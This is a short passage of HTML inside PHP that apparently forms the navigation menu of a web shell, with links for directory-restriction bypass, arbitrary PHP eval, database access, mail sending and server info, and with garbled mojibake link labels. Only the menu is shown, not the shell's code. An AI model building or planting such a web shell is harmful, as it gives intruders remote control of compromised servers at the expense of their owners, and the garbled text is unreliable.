...
<a href="?do=bypassdir&address='.getcwd().'">ƹƶļ</a> -- <a href="?do=eval&address='.getcwd().'">
PHP</a> -- <a href="?do=db&address='.getcwd().'">ݿ</a> -- <a href="?do=ת&address='.getcwd().'">ת</a> -- <a href="?do=mail&address='.getcwd().'">ʼʹ</a><a href="?do=info&address='.getcwd().'">
